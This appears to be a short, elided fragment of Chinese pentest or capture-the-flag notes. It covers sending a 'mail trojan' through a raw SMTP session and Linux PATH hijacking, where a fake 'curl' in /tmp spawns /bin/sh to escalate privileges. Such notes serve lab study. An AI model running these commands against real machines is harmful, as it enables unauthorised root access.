...
登录 smtp 服务发送邮件
[[tips和一些工具/平时用的一些命令 更新中#smtp 邮件木马\|平时用的一些命令 更新中#smtp 邮件木马]]
```
MAIL FROM: test
RCPT TO: helios
data
...
检查发现权限挺高的
#### linux 环境变量劫持
[[tips和一些工具/平时用的一些命令 更新中#linux 环境变量劫持\|平时用的一些命令 更新中#linux 环境变量劫持]]
```
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
...
依旧环境变量劫持
[[tips和一些工具/平时用的一些命令 更新中#^2b355a\|平时用的一些命令 更新中#^2b355a]]  新一代
```
